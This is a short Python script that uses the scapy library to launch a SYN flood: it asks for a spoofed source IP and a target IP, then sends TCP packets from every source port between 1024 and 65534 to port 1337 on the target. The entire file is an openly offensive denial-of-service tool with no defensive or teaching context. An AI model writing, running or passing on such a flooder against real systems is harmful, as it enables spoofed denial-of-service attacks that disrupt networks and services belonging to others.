#!/usr/bin/python

import scapy.all as scapy


def synflood_attack(source, target):
    for sport in range (1024, 65535):
        ip = scapy.IP(src=source, dst=target)
        tcp = scapy.TCP(sport=sport, dport=1337)
        packet = ip/tcp
        scapy.send(packet)


source = str(input("Instert attack Source IP: "))
target = str(input("Insert target's IP address: "))

synflood_attack(source, target)
